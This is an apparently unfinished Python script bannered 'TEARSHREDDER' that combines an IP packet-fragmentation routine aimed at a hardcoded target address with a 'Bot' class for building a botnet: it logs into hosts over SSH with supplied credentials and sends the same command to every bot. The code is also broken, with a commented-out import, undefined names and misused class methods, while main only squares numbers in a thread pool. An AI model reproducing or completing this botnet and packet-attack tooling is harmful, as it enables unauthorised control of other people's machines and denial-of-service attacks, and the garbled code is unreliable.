import argparse
from multiprocessing.dummy import Pool as ThreadPool
import multiprocessing as multi



def banner():


    print("______________________   _____ __________  _________ ___ ________________________________  ________  _____________________ ")
    print("\__    ___/\_   _____/  /  _  \\______    \/   _____//   |   \______   \_   _____/\______ \ \______ \ \_   _____/\______   \\")
    print("  |    |    |    __)_  /  /_\  \|       _/\_____  \/    ~    \       _/|    __)_  |    |  \ |    |  \ |    __)_  |       _/")
    print("  |    |    |        \/    |    \    |   \/        \    Y    /    |   \|        \ |    `   \|    `   \|        \ |    |   \\")
    print("  |____|   /_______  /\____|__  /____|_  /_______  /\___|_  /|____|_  /_______  //_______  /_______  /_______  / |____|_  /")
    print("                   \/         \/       \/        \/       \/        \/        \/         \/        \/        \/         \/ ")



def parseArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', help='Enter -p followed by the port you wish to use', type=int)
    parser.add_argument('-o', help='Enter -o followed by name of output file', type=str)
    args = parser.parse_args()
    parsed = []
    if args.p is not None:
        parsed.append(args.p)
    if args.o is not None:
        parsed.append(args.o)
    return parsed


def test(x):
    print(multi.current_process())
    return x * x


def fragmentPacket(packet, fragsize=1480):

    targetIP = "1.1.1.1"

    fragsize = (fragsize + 7) // 8 * 8
    lst = []
    for p in packet:
        s = (p[targetIP].payload)
        nb = (len(s) + fragsize - 1) // fragsize
        for i in range(nb):
            q = p.copy()
            del(q[targetIP].payload)
            del(q[targetIP].chksum)
            del(q[targetIP].len)
            if i != nb - 1:
                q[targetIP].flags |= 1
            q[targetIP].frag += i * fragsize // 8
            payload = conf.raw_layer(load=s[i * fragsize:(i + 1) * fragsize])
            payload.overload_fields = p[targetIP].payload.overload_fields.copy()
            q.add_payload(payload)
            lst.append(q)
    return lst





"""Creating the bots for the botnet"""

botnet = [] #list of bots in botnet


class Bot:

    #initialization
    def __init__(self, IP, ID, password ):
        self.IP = IP
        self.ID = ID
        self.password = password
        self.session = self.ssh()

    #ssh session
    def ssh(self):
        try:
            #Bot = pxssh.pxssh()
            Bot.login(self.IP, self.ID, self.password)
            return Bot
        except Exception as E:
            print('Failed to Connect')
            print(E)

    def sendCommand(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

    def command(command):
        for bot in botnet:
            attack = Bot.sendCommand(command)
            print('Output from ' + Bot.IP)
            print(attack)

    def add_bot(IP, ID, password):
        new_bot = Bot(IP, ID, password)
        botnet.append(new_bot)


def main():
    banner()
    parsed = parseArgs()
    if parsed == []:
        print('No arguments were entered, exiting program.')
        exit(-1)
    else:
        pass
    pool = ThreadPool(processes=4)
    results = pool.map(test, range(6))
    print(results)
    pool.close()
    pool.join()

main()

